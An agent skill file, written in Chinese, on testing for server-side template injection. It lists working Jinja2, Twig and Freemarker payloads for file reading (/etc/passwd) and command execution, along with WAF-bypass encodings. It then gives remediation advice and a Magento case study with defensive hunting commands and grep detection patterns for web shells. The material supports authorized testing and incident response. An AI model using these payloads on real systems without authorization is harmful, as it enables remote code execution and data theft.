---
name: redteam-ssti
description: "SSTI 服务端模板注入测试 — Jinja2/Twig/Freemarker/Velocity/Thymeleaf 引擎。授权安全测试使用。"
version: 1.1.0
author: Hermes Agent (inspired by VulnClaw redteam-ssti-detail-pack)
license: MIT
metadata:
  hermes:
    tags: [ssti, template-injection, jinja2, twig, freemarker, velocity, thymeleaf, magento, compromise-assessment]
---

# SSTI 服务端模板注入测试

## 漏洞原理

模板引擎将用户输入直接拼入模板，导致模板语法被解析执行。

## 引擎识别

```bash
# 基础探测
curl -s "https://TARGET/page?name={{7*7}}"
# 响应含 49 → Jinja2/Twig

curl -s "https://TARGET/page?name=${7*7}"
# 响应含 49 → Freemarker/Velocity

curl -s "https://TARGET/page?name=<%= 7*7 %>"
# 响应含 49 → ERB/JSP
```

## 各引擎利用

### Jinja2 (Python)
```bash
# 信息收集
{{config}}
{{self.__init__.__globals__}}

# 文件读取
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}

# RCE
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Twig (PHP)
```bash
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

### Freemarker (Java)
```bash
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

## WAF 绕过

- 编码：`%7B%7B7*7%7D%7D`
- 分段：`{{7*'7'}}`
- 替代语法：`${7*7}` / `#{7*7}` / `*{7*7}`

## 修复建议

1. 使用沙箱模式渲染模板
2. 禁止用户输入直接拼入模板
3. 使用逻辑-less 模板（Mustache）

## 实战案例：Magento StyleSmuggler（CVE-2026-75650，2026-09）

> 证据源：Sansec 命名披露、The Hacker News、CrowdSec vulntracking、RedEye Security（观测窗口 2026-09-04~13）。

### 案例要点：SSTI 注入点不在 HTTP 参数里

- CVSS 10.0 无认证 RCE；影响 Adobe Commerce 2.4.4~2.4.9 与 Magento Open Source 2.4.6~2.4.9（≤ 2026-aug 构建）。
- 注入点：模板的 `styles` 属性被写入 PHP 代码（存储型注入）；触发点延迟到渲染「Payment Transaction Failed Reminder」邮件模板时执行。
- 对通用 SSTI 心智模型的修正：审计对象不只是「URL/表单参数拼进模板」，而是一切进入模板引擎的存储数据流——配置项、DB 字段、邮件模板变量；污点分析必须追到延迟渲染汇点。
- 2026-07 与 2026-08 的官方补丁均未挡住该注入技术，「fully patched」商店仍被攻破（9/4 起在野利用）→ 厂商补丁不等于免疫，每次绕过披露后要重测既有防御。
- 时间线：9/4 首个在野利用 → 9/7~9/8 hotfix VULN-39341（APSB26-138/146）→ 9/8 CISA KEV（FCEB 截止 9/11）→ 9/9 CrowdSec 检测规则上线。

### 载荷面：Rust ELF 后门 + PHP web shell（双 actor）

1. Rust 编译 Linux 后门：进程伪装为 `[kworker/u:8:0]`、`fc-cache`、`chronyd`；C2 流量伪装成 NTP（UDP/123）时间同步包 → 面向「PHP 恶意软件」的特征库全部失效，需 Linux 主机层 IOC 巡检。
2. PHP dropper：向产品图片缓存目录（`pub/media/catalog/product/cache`）写入可执行任意 PHP 的 web shell。

### 事后入侵排查 SOP（compromise assessment；补丁只是第一步）

```bash
# 1. 进程伪装排查：真实内核线程的 /proc/<PID>/exe 无链接；伪装进程的 exe 指向磁盘 ELF 即为后门
ps aux | grep -E 'kworker/u|fc-cache|chronyd'
ls -l /proc/<PID>/exe

# 2. NTP 形状 C2：UDP/123 上出现非 chronyd/ntpd 进程的流量
ss -tulpn | grep ':123'
tcpdump -ni any 'udp port 123' -c 200   # 观察 payload 是否为正常 NTP 结构

# 3. Magento 专属：静态资源目录中出现 .php 即为异常
find pub/media/catalog/product/cache -name '*.php' -mtime -60
grep -rEl 'eval\(|base64_decode|assert\(|system\(' pub/media/ --include='*.php'

# 4. 模板/邮件持久化排查：styles 属性与邮件模板是否残留注入代码
#    后台 Marketing → Email Templates + core_email_template 表全量审读

# 5. 持久化面：cron 与计划任务
crontab -l; ls -la /etc/cron*; systemctl list-timers --all
```

### 修复两步走（Adobe 官方要求，缺一不可）

1. 按版本应用 VULN-39341 hotfix。
2. 轮换 encryption key——Magento 加密密钥保护支付配置、integration tokens、API 凭据；零日窗口内攻击者可能已读取密文，按「assume the attacker read your secrets」处置。只打补丁不换 key，攻击者仍可用旧 key 解密历史窃取数据。

### 攻防时间差教训

首个利用(9/4) → 厂商 hotfix(9/7) → KEV(9/8) → 通用检测规则(9/9)：红队视角说明 0day 利用窗口必然存在；蓝队视角说明检测不能等规则——NTP 异常外联、静态目录 .php、伪装内核进程三类低依赖 IOC 应进入日常巡检。

## 参考资源

- PayloadsAllTheThings SSTI
- HackTricks SSTI
- Sansec StyleSmuggler 披露与 CrowdSec CVE-2026-75650 vulntracking 报告
